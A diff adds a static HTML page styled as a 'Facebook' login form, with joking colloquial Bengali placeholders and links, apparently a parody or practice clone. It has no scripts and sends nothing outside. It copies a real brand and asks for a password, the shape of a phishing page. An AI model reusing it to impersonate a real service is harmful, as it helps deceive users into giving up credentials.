@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Facebook</title>
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+      }
+      .hero {
+        margin: 0 auto;
+        /* background-color: rgb(246, 246, 246); */
+        max-width: 900px;
+        padding: 10px;
+        border-radius: 5px;
+      }
+      header {
+        width: 100%;
+        height: 20vh;
+        background-color: #005cae;
+        color: white;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-size: 2rem;
+        margin: auto;
+      }
+      section {
+        margin: 0 2rem;
+        margin-top: 4rem;
+        /* max-width: 1500px; */
+        text-align: center;
+      }
+      input {
+        margin-bottom: 1rem;
+        width: 100%;
+        outline: none;
+        padding: 8px;
+        border: none;
+        border-bottom: 0.1px solid rgba(0, 0, 0, 0.4);
+      }
+      input:focus {
+        box-shadow: 2px 2px 5px 1px rgba(0, 46, 253, 0.2);
+      }
+      .btn {
+        /* box-sizing: border-box */
+        width: 100%;
+        padding: 7px;
+        /* margin-bottom: 1em; */
+        background-color: #006aff;
+        color: white;
+        font-weight: bold;
+        outline: none;
+        border: none;
+        border-radius: 3px;
+        text-decoration: none;
+      }
+      .for {
+        font-weight: bold;
+        margin: 1rem 0;
+        margin-bottom: 3rem;
+        color: #4267b2;
+      }
+      .for a {
+        text-decoration: none;
+        color: #4267b2;
+      }
+      footer {
+        text-align: center;
+        box-sizing: border-box;
+      }
+      footer p {
+        margin: 4rem 2rem;
+        background-color: #56953e;
+        padding: 5px;
+        border-radius: 3px;
+        color: white;
+        font-weight: bold;
+      }
+      footer a {
+        text-decoration: none;
+        color: white;
+        cursor: pointer;
+      }
+      hr {
+        width: 90%;
+        margin: auto;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <header>
+        <h1>Facebook</h1>
+      </header>
+      <div class="hero">
+        <section>
+          <form action="/login.html">
+            <input
+              type="text"
+              name="username"
+              class="phone"
+              placeholder="তর নম্বর দে।"
+              required
+            /><br />
+            <input
+              type="password"
+              name="password"
+              class="pass"
+              placeholder="তর পাসওয়ার্ড দে"
+              required
+            /><br />
+            <button href="login.html" class="btn">ঢুইক্কা পর</button>
+
+            <p class="for">
+              <a href="forget.html"> পাসওয়ার্ড ভুইল্লা গেছছ? এইনো গুতা দে </a>
+            </p>
+          </form>
+        </section>
+        <footer>
+          <hr />
+          <p><a href="signupfun.html">ফেসবুকে নতুন নাকি? এইনে গুতা দে। </a></p>
+        </footer>
+      </div>
+    </div>
+  </body>
+</html>
